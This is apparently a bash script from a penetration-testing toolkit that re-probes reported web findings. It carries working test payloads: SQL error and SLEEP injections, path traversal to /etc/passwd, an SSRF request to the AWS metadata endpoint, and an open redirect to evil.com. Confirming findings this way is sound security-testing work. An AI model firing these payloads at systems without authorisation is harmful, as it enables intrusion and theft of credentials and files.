#!/bin/bash
# validate_finding.sh — Re-probe a finding to confirm or reject it
# Usage: ./validate_finding.sh <FINDING_TYPE> <TARGET_URL> [EXTRA_PARAMS]
# Finding types: xss, sqli, ssrf, lfi, idor, open_redirect, header_missing, xxe
# Example: ./validate_finding.sh xss "https://example.com/search?q=FUZZ"
# Example: ./validate_finding.sh sqli "https://example.com/item?id=FUZZ"

set -euo pipefail

FINDING_TYPE="${1:?Usage: $0 <FINDING_TYPE> <TARGET_URL> [extra]}"
TARGET="${2:?Missing target URL}"
EXTRA="${3:-}"

OUTPUT_DIR="/tmp/kripa_validation_$$"
mkdir -p "$OUTPUT_DIR"

cleanup() { echo "[*] Evidence saved to: $OUTPUT_DIR (preserve before exit)"; }
trap cleanup EXIT

echo "[KRIPA] Validating finding: $FINDING_TYPE"
echo "[KRIPA] Target: $TARGET"
echo ""

case "$FINDING_TYPE" in

  xss)
    echo "[*] XSS re-probe — testing reflection of canary string"
    CANARY="KRIPA_XSS_$(date +%s)"
    URL="${TARGET/FUZZ/$CANARY}"
    RESPONSE=$(curl -sk -L -o "$OUTPUT_DIR/xss_response.html" -w "%{http_code}" "$URL")
    echo "    HTTP: $RESPONSE"
    if grep -qF "$CANARY" "$OUTPUT_DIR/xss_response.html"; then
      echo "    [CONFIRMED] Canary reflected in response body."
      grep -o ".\{0,50\}${CANARY}.\{0,50\}" "$OUTPUT_DIR/xss_response.html" | head -3
    else
      echo "    [NOT CONFIRMED] Canary not found in response. Check context manually."
    fi
    ;;

  sqli)
    echo "[*] SQLi re-probe — testing error-based and time-based"
    # Error-based
    URL_ERR="${TARGET/FUZZ/\'}"
    ERR_CODE=$(curl -sk -L -o "$OUTPUT_DIR/sqli_error.html" -w "%{http_code}" "$URL_ERR")
    echo "    Error probe HTTP: $ERR_CODE"
    if grep -qiE "sql|syntax|ORA-|mysql|pg_|unterminated" "$OUTPUT_DIR/sqli_error.html"; then
      echo "    [CONFIRMED] SQL error detected in response."
    else
      echo "    No obvious SQL error. Testing time-based..."
      # Time-based (generic sleep payload — adjust for DB type)
      URL_TIME="${TARGET/FUZZ/1 AND SLEEP(3)--}"
      START=$(date +%s%3N)
      curl -sk -o /dev/null -L "$URL_TIME" || true
      END=$(date +%s%3N)
      ELAPSED=$(( END - START ))
      echo "    Time-based delay: ${ELAPSED}ms"
      if [ "$ELAPSED" -gt 2500 ]; then
        echo "    [CONFIRMED] Response delayed — likely time-based SQLi."
      else
        echo "    [NOT CONFIRMED] No delay detected."
      fi
    fi
    ;;

  lfi)
    echo "[*] LFI re-probe — testing /etc/passwd inclusion"
    for PAYLOAD in "../../../etc/passwd" "....//....//....//etc/passwd" "%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd"; do
      URL="${TARGET/FUZZ/$PAYLOAD}"
      CODE=$(curl -sk -L -o "$OUTPUT_DIR/lfi_response.html" -w "%{http_code}" "$URL")
      if grep -q "root:x:" "$OUTPUT_DIR/lfi_response.html" 2>/dev/null; then
        echo "    [CONFIRMED] /etc/passwd content found with payload: $PAYLOAD"
        break
      fi
    done
    grep -q "root:x:" "$OUTPUT_DIR/lfi_response.html" 2>/dev/null || echo "    [NOT CONFIRMED] /etc/passwd not reflected."
    ;;

  ssrf)
    echo "[*] SSRF re-probe — testing internal metadata and OOB"
    echo "    Testing AWS metadata endpoint..."
    URL_META="${TARGET/FUZZ/http:\/\/169.254.169.254\/latest\/meta-data\/}"
    META_RESP=$(curl -sk -L --max-time 5 -o "$OUTPUT_DIR/ssrf_meta.txt" -w "%{http_code}" "$URL_META" || echo "000")
    echo "    Metadata HTTP: $META_RESP"
    if grep -qE "ami-id|instance-id|hostname" "$OUTPUT_DIR/ssrf_meta.txt" 2>/dev/null; then
      echo "    [CONFIRMED] AWS metadata returned in response."
    else
      echo "    Use Burp Collaborator / interactsh for OOB SSRF confirmation."
    fi
    ;;

  open_redirect)
    echo "[*] Open Redirect re-probe — testing redirect to external host"
    URL="${TARGET/FUZZ/https:\/\/evil.com\/}"
    LOCATION=$(curl -sk -o /dev/null -w "%{redirect_url}" "$URL" || echo "")
    echo "    Redirect-to: $LOCATION"
    if echo "$LOCATION" | grep -q "evil.com"; then
      echo "    [CONFIRMED] Redirects to external domain."
    else
      echo "    [NOT CONFIRMED] No redirect to test domain detected."
    fi
    ;;

  header_missing)
    echo "[*] Missing security header re-probe"
    HEADERS=$(curl -sk -I -L "$TARGET" -o /dev/null -D "$OUTPUT_DIR/headers.txt")
    cat "$OUTPUT_DIR/headers.txt"
    echo ""
    for HEADER in "Strict-Transport-Security" "Content-Security-Policy" "X-Frame-Options" "X-Content-Type-Options" "Referrer-Policy" "Permissions-Policy"; do
      if grep -qi "$HEADER" "$OUTPUT_DIR/headers.txt"; then
        echo "    [PRESENT] $HEADER"
      else
        echo "    [MISSING] $HEADER"
      fi
    done
    ;;

  idor)
    echo "[*] IDOR re-probe — manual confirmation required"
    echo "    Target: $TARGET"
    echo "    Use two different authenticated user sessions."
    echo "    Account A: access resource at TARGET"
    echo "    Account B: access same resource — if accessible, IDOR CONFIRMED."
    echo "    Document: user A ID, user B ID, resource ID, response comparison."
    ;;

  *)
    echo "[!] Unknown finding type: $FINDING_TYPE"
    echo "    Supported: xss, sqli, lfi, ssrf, open_redirect, header_missing, idor"
    exit 1
    ;;
esac

echo ""
echo "[KRIPA] Validation complete. Evidence in: $OUTPUT_DIR"
